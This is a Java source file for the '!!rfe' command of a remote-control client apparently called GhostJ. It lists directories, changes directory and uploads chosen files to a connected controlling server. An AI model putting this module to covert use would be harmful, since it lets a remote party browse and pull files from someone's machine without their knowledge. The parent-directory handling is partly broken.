package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.cmd.CommandProcessException;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.core.Processor;

import java.io.File;
import java.util.Arrays;

/**
 * 读取文件列表和操作文件
 * Rock's File Explorer
 * @author Rock Chin
 */
public class FuncRFE implements AbstractFunc {
	public static String currentDir=".";//rfe 目前指向的目录
	static {
		currentDir=System.getProperty("user.dir");
	}
	@Override
	public String getFuncName() {
		return "!!rfe";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params...]"};
	}

	@Override
	public String getDescription() {
		return "get files info";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		switch (params[0]){
			case "dir":{
				File crtDir=new File(currentDir);
				if(!crtDir.exists()){
					sendError("notExist");
				}else if (!crtDir.isDirectory()){
					sendError("notADir");
				}else {
					File[] crtLs = crtDir.listFiles();
					HandleConn.writeToServerIgnoreException("!reDir " + Arrays.toString(crtLs) + "!");
				}
				break;
			}
			case "cd":{
				File target=new File(currentDir+File.separatorChar+params[1]);
				if(!target.exists()){
					sendError("notExist");
				} else if (!target.isDirectory()){
					sendError("notADir");
				}else {
					if (params[1].equals("..")){//upper dir
						String[] dirSpt=currentDir.split("\\\\");
						currentDir= arrayToString(dirSpt,0,dirSpt.length-1,File.separator);
					} else {
						currentDir+=File.separator+params[1];
					}
					HandleConn.writeToServerIgnoreException("!cd "+currentDir+"!");
				}
				break;
			}
			case "upload": {
				//rftx还没适配先使用rft先
				if (params.length < 2) {
					sendError("illegalParam");
				}
				if (!new File(currentDir + File.separatorChar + params[1]).exists()){
					sendError("noSuchFile");
				}
				try {
					processor.start("!!rft upload "+currentDir+File.separatorChar+params[1]);
				} catch (CommandProcessException e) {
					sendError("cannotUpload:"+ ClientMain.getErrorInfo(e));
				}
				break;
			}
			case "download":{

			}
		}
		HandleConn.sendFinishToServer();
	}
	public void sendError(String errMsg){
		HandleConn.writeToServerIgnoreException("!rfeError:"+errMsg+"!\n");
	}

	public String arrayToString(String[] arr,int start,int end,String sep){
		StringBuffer result=new StringBuffer();
		for(int i=start;i<end;i++){
			result.append(arr[i]+(i==end-1?"":sep));
		}
		return result.toString();
	}
}
